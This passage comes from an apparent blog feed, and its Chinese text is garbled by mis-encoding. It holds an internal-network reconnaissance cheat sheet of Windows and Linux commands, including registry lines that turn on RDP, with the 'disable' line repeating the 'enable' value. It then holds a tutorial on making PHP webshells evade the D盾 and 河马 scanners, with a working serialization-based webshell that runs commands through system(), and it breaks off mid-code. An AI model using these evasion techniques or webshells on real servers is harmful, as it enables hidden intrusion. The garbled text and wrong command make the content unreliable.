title="ç½‘ç»œä¿¡æ¯"></a>ç½‘ç»œä¿¡æ¯</h4><ol><li>æŸ¥çœ‹ç½‘ç»œä¿¡æ¯<figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">ifconfig</span><br></code></pre></td></tr></table></figure></li><li>æŸ¥çœ‹hostä¿¡æ¯<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">cat <span class="hljs-regexp">/etc/</span>hosts<br></code></pre></td></tr></table></figure></li><li>æŸ¥çœ‹ç½‘å¡ä¿¡æ¯<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs routeros">ifconfig<br>arp -a<br>route print<br>netstat -anot<br>Get-NetTCPConnection<br></code></pre></td></tr></table></figure><h4 id="æ–‡ä»¶ä¿¡æ¯"><a href="#æ–‡ä»¶ä¿¡æ¯" class="headerlink" title="æ–‡ä»¶ä¿¡æ¯"></a>æ–‡ä»¶ä¿¡æ¯</h4></li></ol><h4 id="æœåŠ¡ä¿¡æ¯"><a href="#æœåŠ¡ä¿¡æ¯" class="headerlink" title="æœåŠ¡ä¿¡æ¯"></a>æœåŠ¡ä¿¡æ¯</h4><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-built_in">sc</span> query<br>wmic service list brief<br><span class="hljs-built_in">Get-WmiObject</span> win32_service | <span class="hljs-built_in">select</span> PathName<br></code></pre></td></tr></table></figure><h4 id="æ—¥å¿—ä¿¡æ¯"><a href="#æ—¥å¿—ä¿¡æ¯" class="headerlink" title="æ—¥å¿—ä¿¡æ¯"></a>æ—¥å¿—ä¿¡æ¯</h4><h4 id="è½¯ä»¶ä¿¡æ¯"><a href="#è½¯ä»¶ä¿¡æ¯" class="headerlink" title="è½¯ä»¶ä¿¡æ¯"></a>è½¯ä»¶ä¿¡æ¯</h4><figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs applescript">wmic product <span class="hljs-keyword">get</span> <span class="hljs-built_in">name</span>,<span class="hljs-built_in">version</span><br></code></pre></td></tr></table></figure><h4 id="é©±åŠ¨ä¿¡æ¯"><a href="#é©±åŠ¨ä¿¡æ¯" class="headerlink" title="é©±åŠ¨ä¿¡æ¯"></a>é©±åŠ¨ä¿¡æ¯</h4><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">DRIVERQUERY</span><br></code></pre></td></tr></table></figure><h4 id="åç¼€ä¿¡æ¯"><a href="#åç¼€ä¿¡æ¯" class="headerlink" title="åç¼€ä¿¡æ¯"></a>åç¼€ä¿¡æ¯</h4><h4 id="æ³¨å†Œè¡¨ä¿¡æ¯"><a href="#æ³¨å†Œè¡¨ä¿¡æ¯" class="headerlink" title="æ³¨å†Œè¡¨ä¿¡æ¯"></a>æ³¨å†Œè¡¨ä¿¡æ¯</h4><h4 id="é˜²ç«å¢™ä¿¡æ¯"><a href="#é˜²ç«å¢™ä¿¡æ¯" class="headerlink" title="é˜²ç«å¢™ä¿¡æ¯"></a>é˜²ç«å¢™ä¿¡æ¯</h4><h3 id="Windows"><a href="#Windows" class="headerlink" title="Windows"></a>Windows</h3><h4 id="ç”¨æˆ·ä¿¡æ¯-1"><a href="#ç”¨æˆ·ä¿¡æ¯-1" class="headerlink" title="ç”¨æˆ·ä¿¡æ¯"></a>ç”¨æˆ·ä¿¡æ¯</h4><ol><li>ç”¨æˆ·åç§°<figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">net <span class="hljs-keyword">user</span> æŸ¥çœ‹å½“å‰ç”¨æˆ·åç§°<br>whoami æŸ¥çœ‹å½“å‰ç”¨æˆ·åç§° <br>quserï¼ˆquery <span class="hljs-keyword">user</span>ï¼‰ æŸ¥çœ‹å½“å‰ç”¨æˆ·åç§°<br>wmic useraccount <span class="hljs-keyword">get</span> /<span class="hljs-keyword">ALL</span> /<span class="hljs-keyword">format</span>:csv<br></code></pre></td></tr></table></figure></li><li>ç”¨æˆ·æƒé™<figure class="highlight dos"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dos"><span class="hljs-built_in">net</span> localgroup administrators<br></code></pre></td></tr></table></figure><h4 id="è¿›ç¨‹ä¿¡æ¯-1"><a href="#è¿›ç¨‹ä¿¡æ¯-1" class="headerlink" title="è¿›ç¨‹ä¿¡æ¯"></a>è¿›ç¨‹ä¿¡æ¯</h4></li><li>æŸ¥çœ‹è¿›ç¨‹<figure class="highlight dsconfig"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs dsconfig"><span class="hljs-string">tasklist</span><br><span class="hljs-string">get</span>-<span class="hljs-string">process</span><br><span class="hljs-string">wmic</span> <span class="hljs-string">process</span> <span class="hljs-string">get</span> <span class="hljs-string">caption</span>,<span class="hljs-string">executablepath</span>,<span class="hljs-string">commandline</span> /<span class="hljs-string">format:csv</span><br></code></pre></td></tr></table></figure></li><li>ç­›é€‰è¿›ç¨‹<figure class="highlight dsconfig"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs dsconfig"><span class="hljs-string">tasklist</span> | <span class="hljs-string">findstr</span> <span class="hljs-string">&quot;explorer.exe&quot;</span><br><span class="hljs-string">tasklist</span> /<span class="hljs-string">fi</span> <span class="hljs-string">&quot;ImageName eq explorer.exe&quot;</span><br><span class="hljs-built_in">get-process</span> | <span class="hljs-string">findstr</span> <span class="hljs-string">&quot;explorer.exe&quot;</span><br></code></pre></td></tr></table></figure></li><li>è¿›ç¨‹ç«¯å£<figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs 1c">netstat -ano <span class="hljs-string">| findstr &quot;</span><span class="hljs-number">80</span><span class="hljs-string">&quot;</span><br></code></pre></td></tr></table></figure></li><li>è¿›ç¨‹å†…å­˜<figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">procdump</span>  <span class="hljs-comment">#åˆ©ç”¨å·¥å…·</span><br></code></pre></td></tr></table></figure></li><li>è¿›ç¨‹æƒé™<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plain"><br></code></pre></td></tr></table></figure></li><li>è¿›ç¨‹æ¨¡å—<figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs jboss-cli">tasklist <span class="hljs-string">/fi</span> <span class="hljs-string">&quot;ImageName eq explorer.exe&quot;</span> <span class="hljs-string">/m</span><br></code></pre></td></tr></table></figure></li><li>æ¨¡å—æœç´¢<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">tasklist /<span class="hljs-keyword">fi</span> <span class="hljs-string">&quot;MODULES eq capauthz.dll&quot;</span><br></code></pre></td></tr></table></figure><h4 id="ç³»ç»Ÿä¿¡æ¯-1"><a href="#ç³»ç»Ÿä¿¡æ¯-1" class="headerlink" title="ç³»ç»Ÿä¿¡æ¯"></a>ç³»ç»Ÿä¿¡æ¯</h4></li><li>ä¸»æœºåç§°<figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs markdown">hostname<br>[<span class="hljs-symbol">System.Net.DNS</span>]:<span class="hljs-link">:GetHostByName($Null)</span><br></code></pre></td></tr></table></figure><h4 id="ç¯å¢ƒå˜é‡"><a href="#ç¯å¢ƒå˜é‡" class="headerlink" title="ç¯å¢ƒå˜é‡"></a>ç¯å¢ƒå˜é‡</h4></li><li>æŸ¥çœ‹å˜é‡<figure class="highlight actionscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs actionscript"><span class="hljs-keyword">set</span><br></code></pre></td></tr></table></figure></li><li>è®¾ç½®å˜é‡<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-builtin-name">set</span> <span class="hljs-attribute">test</span>=Glacier ä¸€æ¬¡æ€§<br>setx test <span class="hljs-string">&quot;Glacier&quot;</span> æ°¸ä¹…<br></code></pre></td></tr></table></figure><h4 id="ç³»ç»Ÿç‰ˆæœ¬"><a href="#ç³»ç»Ÿç‰ˆæœ¬" class="headerlink" title="ç³»ç»Ÿç‰ˆæœ¬"></a>ç³»ç»Ÿç‰ˆæœ¬</h4><figure class="highlight dos"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs dos"><span class="hljs-built_in">ver</span> æŸ¥çœ‹å½“å‰æœåŠ¡å™¨æ“ä½œç³»ç»Ÿç‰ˆæœ¬<br>systeminfo æŸ¥çœ‹å½“å‰ç³»ç»Ÿç‰ˆæœ¬ä¸è¡¥ä¸ä¿¡æ¯<br></code></pre></td></tr></table></figure><h4 id="å¯åŠ¨ä¿¡æ¯-1"><a href="#å¯åŠ¨ä¿¡æ¯-1" class="headerlink" title="å¯åŠ¨ä¿¡æ¯"></a>å¯åŠ¨ä¿¡æ¯</h4></li><li>æŸ¥çœ‹è‡ªå¯åŠ¨é¡¹<figure class="highlight taggerscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs taggerscript">dir &quot;C:<span class="hljs-symbol">\P</span>rogramData<span class="hljs-symbol">\M</span>icrosoft<span class="hljs-symbol">\W</span>indows<span class="hljs-symbol">\S</span>tart Menu<span class="hljs-symbol">\P</span>rograms<span class="hljs-symbol">\S</span>tartUp&quot;<br></code></pre></td></tr></table></figure><h4 id="è®¡åˆ’ä»»åŠ¡-1"><a href="#è®¡åˆ’ä»»åŠ¡-1" class="headerlink" title="è®¡åˆ’ä»»åŠ¡"></a>è®¡åˆ’ä»»åŠ¡</h4></li><li>æŸ¥çœ‹è®¡åˆ’ä»»åŠ¡<figure class="highlight erlang"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs erlang">schtasks /<span class="hljs-keyword">query</span><br></code></pre></td></tr></table></figure><h4 id="åç¼€ä¿¡æ¯-1"><a href="#åç¼€ä¿¡æ¯-1" class="headerlink" title="åç¼€ä¿¡æ¯"></a>åç¼€ä¿¡æ¯</h4></li><li>æŸ¥çœ‹æ–‡ä»¶å…³è”<figure class="highlight dos"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs dos"><span class="hljs-built_in">assoc</span> .txt<br><span class="hljs-built_in">ftype</span> | <span class="hljs-built_in">findstr</span> txt<br></code></pre></td></tr></table></figure><h4 id="æ³¨å†Œè¡¨é¡¹"><a href="#æ³¨å†Œè¡¨é¡¹" class="headerlink" title="æ³¨å†Œè¡¨é¡¹"></a>æ³¨å†Œè¡¨é¡¹</h4></li><li>å¼€å¯3389ç«¯å£<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal<span class="hljs-string">&quot; &quot;</span>Server <span class="hljs-regexp">/v fDenyTSConnections /</span>t REG_DWORD <span class="hljs-regexp">/d 00000000 /</span>f<br></code></pre></td></tr></table></figure></li><li>å…³é—­3389ç«¯å£<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal<span class="hljs-string">&quot; &quot;</span>Server <span class="hljs-regexp">/v fDenyTSConnections /</span>t REG_DWORD <span class="hljs-regexp">/d 00000000 /</span>f<br></code></pre></td></tr></table></figure><h4 id="åŸŸå†…ä¿¡æ¯"><a href="#åŸŸå†…ä¿¡æ¯" class="headerlink" title="åŸŸå†…ä¿¡æ¯"></a>åŸŸå†…ä¿¡æ¯</h4></li></ol><h4 id="å¯†ç ä¿¡æ¯-1"><a href="#å¯†ç ä¿¡æ¯-1" class="headerlink" title="å¯†ç ä¿¡æ¯"></a>å¯†ç ä¿¡æ¯</h4><h4 id="ç¥¨æ®ä¿¡æ¯-1"><a href="#ç¥¨æ®ä¿¡æ¯-1" class="headerlink" title="ç¥¨æ®ä¿¡æ¯"></a>ç¥¨æ®ä¿¡æ¯</h4><h4 id="æœåŠ¡ä¿¡æ¯-1"><a href="#æœåŠ¡ä¿¡æ¯-1" class="headerlink" title="æœåŠ¡ä¿¡æ¯"></a>æœåŠ¡ä¿¡æ¯</h4><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs powershell">tasklist /svc<br><span class="hljs-built_in">sc</span> query<br>wmic service list brief<br><span class="hljs-built_in">Get-WmiObject</span> win32_service | <span class="hljs-built_in">select</span> PathName<br></code></pre></td></tr></table></figure><h4 id="ç£ç›˜ä¿¡æ¯-1"><a href="#ç£ç›˜ä¿¡æ¯-1" class="headerlink" title="ç£ç›˜ä¿¡æ¯"></a>ç£ç›˜ä¿¡æ¯</h4><h4 id="ç½‘ç»œä¿¡æ¯-1"><a href="#ç½‘ç»œä¿¡æ¯-1" class="headerlink" title="ç½‘ç»œä¿¡æ¯"></a>ç½‘ç»œä¿¡æ¯</h4><ol><li>æŸ¥çœ‹ç½‘ç»œä¿¡æ¯<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs routeros">ipconfig<br>arp -a<br>route print<br>netstat -anot<br>Get-NetTCPConnection<br></code></pre></td></tr></table></figure><h4 id="æ–‡ä»¶ä¿¡æ¯-1"><a href="#æ–‡ä»¶ä¿¡æ¯-1" class="headerlink" title="æ–‡ä»¶ä¿¡æ¯"></a>æ–‡ä»¶ä¿¡æ¯</h4></li></ol><h4 id="æ—¥å¿—ä¿¡æ¯-1"><a href="#æ—¥å¿—ä¿¡æ¯-1" class="headerlink" title="æ—¥å¿—ä¿¡æ¯"></a>æ—¥å¿—ä¿¡æ¯</h4><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">eventvwr</span><br></code></pre></td></tr></table></figure><h4 id="è½¯ä»¶ä¿¡æ¯-1"><a href="#è½¯ä»¶ä¿¡æ¯-1" class="headerlink" title="è½¯ä»¶ä¿¡æ¯"></a>è½¯ä»¶ä¿¡æ¯</h4><figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs applescript">wmic product <span class="hljs-keyword">get</span> <span class="hljs-built_in">name</span>,<span class="hljs-built_in">version</span><br></code></pre></td></tr></table></figure><h4 id="é©±åŠ¨ä¿¡æ¯-1"><a href="#é©±åŠ¨ä¿¡æ¯-1" class="headerlink" title="é©±åŠ¨ä¿¡æ¯"></a>é©±åŠ¨ä¿¡æ¯</h4><figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs jboss-cli">DRIVERQUERY <span class="hljs-string">/V</span><br></code></pre></td></tr></table></figure><h4 id="åç¼€ä¿¡æ¯-2"><a href="#åç¼€ä¿¡æ¯-2" class="headerlink" title="åç¼€ä¿¡æ¯"></a>åç¼€ä¿¡æ¯</h4><h4 id="æ³¨å†Œè¡¨ä¿¡æ¯-1"><a href="#æ³¨å†Œè¡¨ä¿¡æ¯-1" class="headerlink" title="æ³¨å†Œè¡¨ä¿¡æ¯"></a>æ³¨å†Œè¡¨ä¿¡æ¯</h4><h4 id="é˜²ç«å¢™ä¿¡æ¯-1"><a href="#é˜²ç«å¢™ä¿¡æ¯-1" class="headerlink" title="é˜²ç«å¢™ä¿¡æ¯"></a>é˜²ç«å¢™ä¿¡æ¯</h4><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">netsh advfirewall firewall</span><br></code></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> æ¸—é€ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> å†…ç½‘ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>PHPå…æ€</title>
      <link href="2022/09/11/PHP%E5%85%8D%E6%9D%80/"/>
      <url>2022/09/11/PHP%E5%85%8D%E6%9D%80/</url>
      
        <content type="html"><![CDATA[<h1 id="å…æ€"><a href="#å…æ€" class="headerlink" title="å…æ€"></a>å…æ€</h1><p>å…æ€å°±æ˜¯åˆ¶ä½œå¼€å‘çš„ç—…æ¯’æœ¨é©¬ï¼ˆè„šæœ¬æˆ–è€…äºŒè¿›åˆ¶ï¼‰ä¸è¢«æ€æ¯’è½¯ä»¶æ£€æµ‹å‡ºã€‚<br>è€Œå¯¹äºwebæ‰‹è€Œè¨€ï¼Œæœ€ç†Ÿæ‚‰ï¼Œä¹Ÿæ˜¯æœ€å¥½å…¥æ‰‹çš„å°±æ˜¯phpå…æ€</p><a id="more"></a><h2 id="å…æ€æ€è·¯"><a href="#å…æ€æ€è·¯" class="headerlink" title="å…æ€æ€è·¯"></a>å…æ€æ€è·¯</h2><p>åˆ†ææ€è½¯ï¼ˆWAFï¼‰,ä¸ºä»€ä¹ˆæ€ä½ åˆ¶ä½œçš„ç—…æ¯’æœ¨é©¬,æ˜¯è§„åˆ™åŒ¹é…å¼•æ“ï¼Œæ˜¯æœºå™¨å­¦ä¹ å¼•æ“ï¼Œç­‰ç­‰ã€‚åªæœ‰ä½ çŸ¥é“WAFä¸ºä»€ä¹ˆæŸ¥æ€ä½ ï¼Œä½ æ‰çŸ¥é“å¦‚ä½•ç»•è¿‡ï¼Œè¾¾åˆ°å…æ€æ•ˆæœã€‚</p><h2 id="å…æ€è¿‡ç¨‹"><a href="#å…æ€è¿‡ç¨‹" class="headerlink" title="å…æ€è¿‡ç¨‹"></a>å…æ€è¿‡ç¨‹</h2><ol><li>å®šä½å…³é”®ç‚¹</li><li>åˆ†æå…³é”®ç‚¹</li><li>æ··æ·†å…³é”®ç‚¹</li></ol><h2 id="æ€è½¯ç±»å‹"><a href="#æ€è½¯ç±»å‹" class="headerlink" title="æ€è½¯ç±»å‹"></a>æ€è½¯ç±»å‹</h2><ol><li>æœ¬åœ°æ€è½¯</li><li>äº‘ç«¯æ€è½¯</li><li>äºŒè¿›åˆ¶æ€è½¯</li><li>è„šæœ¬æ€è½¯</li></ol><h2 id="å¸¸ç”¨æ–¹æ³•"><a href="#å¸¸ç”¨æ–¹æ³•" class="headerlink" title="å¸¸ç”¨æ–¹æ³•"></a>å¸¸ç”¨æ–¹æ³•</h2><ol><li>å·¥å…·å…æ€</li><li>ä»£ç è†¨èƒ€ï¼ˆå¢åŠ ä»£ç é‡ï¼‰</li><li>å¤šå±‚å‡½æ•°åµŒå¥—</li></ol><h3 id="æœ¬åœ°æ€è½¯"><a href="#æœ¬åœ°æ€è½¯" class="headerlink" title="æœ¬åœ°æ€è½¯"></a>æœ¬åœ°æ€è½¯</h3><p>æœ¬åœ°æ€è½¯ä¸»è¦æ˜¯ç»•è¿‡ç«ç»’ï¼Œå®‰å…¨ç‹—ï¼ŒDç›¾ï¼Œæ²³é©¬ç­‰ï¼Œè€Œæœ¬åœ°æ€è½¯å¯¹æ¯”èµ·å…¶ä»–æ–¹å¼ï¼Œå¯¹äºæ”»å‡»è€…æ¥è¯´æ˜¯æœ€å‹å¥½çš„ï¼Œå› ä¸ºæœ¬åœ°æ€è½¯100%å¯ä»¥ç¡®å®šèƒ½ä¸èƒ½ç»•è¿‡ï¼Œåªæœ‰ä¸¤ä¸ªç»“æœï¼Œæ¸…æ¥šæ˜ç¡®ï¼Œä¸éœ€è¦çŒœæµ‹ã€‚</p><h4 id="æµ‹è¯•å…æ€Dç›¾"><a href="#æµ‹è¯•å…æ€Dç›¾" class="headerlink" title="æµ‹è¯•å…æ€Dç›¾"></a>æµ‹è¯•å…æ€Dç›¾</h4><p>é¦–å…ˆå†™æœ€ç®€å•çš„ä¸€å¥è¯æœ¨é©¬è¯•è¯•</p><p><img src="https://s2.loli.net/2022/09/11/dXptJhWv5Zf7V8B.png" alt="Dç›¾æˆåŠŸæ‹¦æˆª"></p><p>å†è¯•è¯•æˆ‘ä»¬å¸¸ç”¨æ–¹æ³•ä¸­çš„ä»£ç è†¨èƒ€ï¼Œä¸»è¦æ˜¯å‘å…¶æ³¨å…¥è¶³å¤Ÿçš„åƒåœ¾æ•°æ®ï¼Œæ¥ç»•è¿‡æœ¬åœ°æ€è½¯è½¯ä»¶</p><p><img src="https://s2.loli.net/2022/09/11/N6du4mY2nLStMJq.png" alt="ä»£ç è†¨èƒ€å…æ€å¤±è´¥"></p><p>æŒ‰ç…§æˆ‘ä»¬çš„å…æ€è¿‡ç¨‹ï¼Œæˆ‘ä»¬å…ˆå®šä½å…³é”®ç‚¹ï¼Œå…ˆåˆ¤æ–­æ˜¯å¦è¿‡æ»¤äº†systemå‡½æ•°</p><p><img src="https://s2.loli.net/2022/09/11/2zX7mR6Ww1tHQvA.png" alt="system($a);è¢«æŸ¥æ€"><br><img src="https://s2.loli.net/2022/09/11/GeWxXS5IluTyo6m.png" alt="system();å‡½æ•°èƒ½å¤Ÿæ­£å¸¸ä½¿ç”¨"></p><p>å› æ­¤åˆ¤æ–­ï¼ŒDç›¾ä¼šæ£€æŸ¥systemå‡½æ•°ä¸­çš„å‚æ•°ï¼Œæ¥åˆ¤æ–­å…¶å®‰å…¨æ€§</p><p>ä¾ç„¶æ˜¯è¿‡æ»¤å‚æ•°ï¼Œæˆ‘ä»¬å…ˆè¯•ä¸€ä¸‹ç”¨classæ˜¯å¦èƒ½ç»•è¿‡<br><img src="https://s2.loli.net/2022/09/11/dYfAHs18LGwS9kQ.png" alt="ä½¿ç”¨classå…æ€å¤±è´¥"></p><p>è¿˜æ˜¯è¢«æŸ¥æ€äº†ï¼Œæ—¢ç„¶éƒ½æƒ³åˆ°ç”¨ç±»äº†ï¼Œé‚£å°±å†åºåˆ—åŒ–è¯•ä¸€ä¸‹<br><img src="https://s2.loli.net/2022/09/11/EZmcxgUQ3nAGTpr.png" alt="åºåˆ—åŒ–å…æ€æˆåŠŸ"></p><p>ç»è¿‡åºåˆ—åŒ–ä¹‹åï¼Œæˆ‘ä»¬æˆåŠŸç»•è¿‡äº†ï¼Œä½†è¿™æ ·æ˜¯æ— æ³•æˆåŠŸæ‰§è¡Œçš„ï¼Œæˆ‘ä»¬åªéœ€è¦æˆªå–åºåˆ—åŒ–ä¸­çš„å…³é”®è¯å‡ºæ¥å°±è¡Œ<br><img src="https://s2.loli.net/2022/09/11/4sHpu1UyRfSXk8a.png" alt="å…æ€æˆåŠŸ"><br><img src="https://s2.loli.net/2022/09/11/GODHnIyg2615dqS.png" alt="å‘½ä»¤æ‰§è¡ŒæˆåŠŸ"></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> <br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">C</span> </span>&#123;<br><span class="hljs-keyword">var</span> <span class="hljs-variable">$cmd</span> = <span class="hljs-string">&quot;calc&quot;</span>;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">getC</span>(<span class="hljs-params"></span>) </span>&#123;<br>    <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> C;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">test</span>(<span class="hljs-params"><span class="hljs-variable">$cmd</span></span>)</span><br><span class="hljs-function"></span>&#123;<br><span class="hljs-variable">$l</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;l&quot;</span>];<br>system(substr(serialize(getC()),<span class="hljs-number">26</span>,<span class="hljs-variable">$l</span>));<br>&#125;<br><br>test(<span class="hljs-string">&quot;aa&quot;</span>);<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><h4 id="æµ‹è¯•å…æ€æ²³é©¬"><a href="#æµ‹è¯•å…æ€æ²³é©¬" class="headerlink" title="æµ‹è¯•å…æ€æ²³é©¬"></a>æµ‹è¯•å…æ€æ²³é©¬</h4><p>æˆ‘ä»¬å…ˆå°è¯•ç”¨ä¹‹å‰æˆåŠŸå…æ€Dç›¾çš„ä»£ç æ¥æµ‹è¯•ä¸€ä¸‹æ²³é©¬</p><p><img src="https://s2.loli.net/2022/09/11/MIo57bqju1CESeT.png" alt="è¢«æ²³é©¬æŸ¥æ€"><br>èƒ½ç»•è¿‡Dç›¾çš„ä»£ç ç›´æ¥è¢«æ²³é©¬æŸ¥æ€äº†</p><p>è¿˜æ˜¯æŒ‰ç…§ä¸Šé¢çš„æ€è·¯ï¼Œæˆ‘ä»¬å…ˆå®šä½å…³é”®ç‚¹<br><img src="https://s2.loli.net/2022/09/11/dE8Bq1hpwFkLYi6.png"><br>å‘ç°æ²³é©¬ç›´æ¥è¿‡æ»¤æ‰äº†system()ï¼Œæ— è®ºæ˜¯å¦å¸¦æœ‰å‚æ•°éƒ½ç›´æ¥æŸ¥æ€ï¼ŒæŒºç‹—çš„<br>æ¥ç€å°è¯•ï¼Œå‘ç°eval()å‡½æ•°å¯ä»¥ä½¿ç”¨ï¼Œä½†ç”¨eval()å‡½æ•°å»è°ƒç”¨system()ä¹Ÿä¼šè¢«æŸ¥æ€<br>ç”¨ç¼–ç ç»•è¿‡è¯•ä¸€ä¸‹</p><p>å°†<code>system(calc);</code>base64ç¼–ç å¾—åˆ°<code>c3lzdGVtKCdjbGFjJyk7</code><br><img src="https://s2.loli.net/2022/09/11/I9WHr7kjJp3c2CY.png" alt="è¢«æ²³é©¬æŸ¥æ€"></p><p>ä»ç„¶ä¸èƒ½ç»•è¿‡ï¼Œè²Œä¼¼ä¼šæ£€æµ‹åˆ°base64_decodeå‡½æ•°ï¼Œç½‘ä¸Šæ‰¾ä¸€ä¸ªæ‰‹å†™çš„è„šæœ¬ï¼Œæ”¹ä¸ªå‡½æ•°åè¯•è¯•</p><p><img src="https://s2.loli.net/2022/09/11/iq5KD4AWtwXpIdx.png" alt="è¿˜æ˜¯è¢«æŸ¥æ€"><br>å¥½æ€ªå•Šï¼Œæ€ä¹ˆè¿™æ ·è¿˜æ˜¯è¢«æŸ¥æ€ï¼Œè«éæ˜¯æ²³é©¬è‡ªå·±åå°ç”¨phpè·‘ä¸€éæµ‹è¯•ï¼Œæˆ–è€…æ˜¯è·Ÿéšäº†ä½ çš„ä»£ç æ‰§è¡Œé¡ºåºé€å¥æŸ¥æ€</p><p><img src="https://s2.loli.net/2022/09/11/VLxrkvyQon2WEp3.png"><br>ä¸æ˜¯å§ï¼Œè¿™æ ·è¿˜æ˜¯è¢«æŸ¥æ€äº†ï¼ŒæŒ‰ç…§ä»£ç æ‰§è¡Œé¡ºåºä¹Ÿä¸å¯¹å‘€</p><p>å†åå¤æµ‹è¯•ï¼Œåå¤è°ƒè¯•äº†ä¸€ä¸ªä¸‹åˆï¼Œæœ€åå‘ç°</p><blockquote><p>æŸ¥æ€äº†æ³¨é‡Šï¼ï¼ï¼</p></blockquote><p><img src="https://s2.loli.net/2022/09/11/pKB6mNe7t5Ab24C.png" alt="æˆåŠŸå…æ€"><br>è¿™æ¬¡ç»ˆäºå¯¹äº†ï¼Œåˆ æ‰äº†æ³¨é‡Šï¼ŒæŒ‰ç…§ä»£ç æ‰§è¡Œé¡ºåºï¼Œæ‰§è¡Œä¸åˆ°eval()å‡½æ•°ï¼ŒæˆåŠŸç»•è¿‡äº†æ²³é©¬<br>é‚£æˆ‘ä»¬æ¥ä¸‹æ¥åªéœ€è¦è®©å®ƒæ— æ³•åˆ¤æ–­æ˜¯å¦è¯¥æ‰§è¡Œifæ¡ä»¶ä¸­çš„è¯­å¥ï¼Œå°±èƒ½æˆåŠŸç»•è¿‡</p><p><img src="https://s2.loli.net/2022/09/11/M9w2AGPfQbXkSLt.png" alt="æˆåŠŸæ‰§è¡Œå‘½ä»¤"></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span 